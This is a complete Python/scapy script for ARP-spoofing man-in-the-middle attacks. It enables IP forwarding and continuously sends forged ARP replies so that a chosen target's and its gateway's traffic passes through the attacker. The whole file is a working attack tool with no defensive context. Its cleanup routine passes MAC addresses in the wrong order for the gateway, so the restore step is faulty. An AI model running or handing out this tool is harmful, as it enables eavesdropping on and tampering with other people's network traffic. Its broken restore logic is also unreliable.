import scapy.all as scapy
import time
import argparse
import os
import sys
#op= redirects flow of packet, sent as arp response
## pdst = ip packet target
### hwdst = mac address of target
#### psrc = spoof_arp

def options():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t","--target", dest="target", help="Needs target ip")
    parse.add_argument("-g","--gateway", dest="gateway", help="Needs gateway ip")
    parse.add_argument('-i','--interface',dest='interface',help='Needs interface')
    options= parse.parse_args()
    if  not options.target and not options.gateway and not options.interface:
        parse.error('No target or gateway ip and no interface given. Use -h')
    elif not options.target:
        parse.error('Specify target ip using -t')
    elif not options.gateway:
        parse.error('Specify gateway ip using -g')
    elif not options.interface:
        parse.error('Specify interface using -i')
    else:
        return options

def scan(ip, interface):
    arp_request = scapy.ARP(pdst = ip)
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    ans = scapy.srp(arp_request_broadcast, timeout=1, iface=interface, verbose=False)[0]
    return ans[0][1].hwsrc

def spoof(target_ip,spoof_ip,mac):
    packet =scapy.ARP(op=2, pdst=target_ip ,hwdst=mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(des_ip, source_ip,des_mac,source_mac):
    packet=scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def disable_portforward():
    print('Disabled port forwarding.\n')
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')


options= options()
packet_number = 0
print("ARP spoofing on:", options.target,"\n")
print('Enabling port forwarding.\n')
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
try:
    target_mac= scan(options.target,options.interface)
except Exception:
    print('\nFailed to obtain targets mac address....quitting\n')
    disable_portforward()
    sys.exit()
try:
    gateway_mac=scan(options.gateway,options.interface)
except Exception:
        print('\nFailed to obtain gateways mac address....quitting\n')
        disable_portforward()
        sys.exit()
try:
    while True:
        spoof(options.target,options.gateway,target_mac)
        spoof(options.gateway, options.target,gateway_mac)
        packet_number= packet_number +2
        print("\rNumber of packages sent: " + str(packet_number), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nEnding spoof..... Restoring ARP tables\n")
    tar_mac= scan(options.target,options.interface)
    gate_mac=scan(options.gateway,options.interface)
    restore(options.target,options.gateway,tar_mac,gate_mac)
    restore(options.gateway,options.target,tar_mac,gate_mac)
    disable_portforward()
    sys.exit()
